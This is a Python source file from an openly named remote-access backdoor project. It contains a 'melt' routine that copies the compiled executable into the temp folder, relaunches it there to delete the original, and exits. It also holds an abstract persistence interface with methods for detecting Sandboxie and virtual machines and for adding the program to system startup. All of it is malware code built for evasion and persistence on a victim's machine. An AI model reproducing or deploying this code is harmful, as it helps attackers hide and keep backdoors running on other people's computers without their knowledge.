"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox
"""

import abc
import os
import shutil
import subprocess
import sys
import tempfile


def melt():
    curr_file = os.path.realpath(sys.argv[0])

    # ignore melting if client has not been built
    if curr_file.endswith(".py"):
        return

    # get actual .exe
    curr_file = os.path.realpath(sys.executable)

    tmp = os.path.normpath(tempfile.gettempdir()).lower()

    curr_file_dir = os.path.normpath(os.path.dirname(curr_file)).lower()

    if tmp != curr_file_dir:
        new_file = os.path.join(tmp, os.path.basename(curr_file))
        # if there is a problem copying file, abort melting
        try:
            shutil.copyfile(curr_file, new_file)
        except IOError:
            return

        subprocess.Popen([new_file, "-r", curr_file])
        sys.exit(0)


class Persistence(metaclass=abc.ABCMeta):
    @abc.abstractmethod
    def detect_sandboxie(self):
        pass

    @abc.abstractmethod
    def remove_from_startup(self):
        pass

    @abc.abstractmethod
    def add_startup(self):
        pass

    @abc.abstractmethod
    def detect_vm(self):
        pass
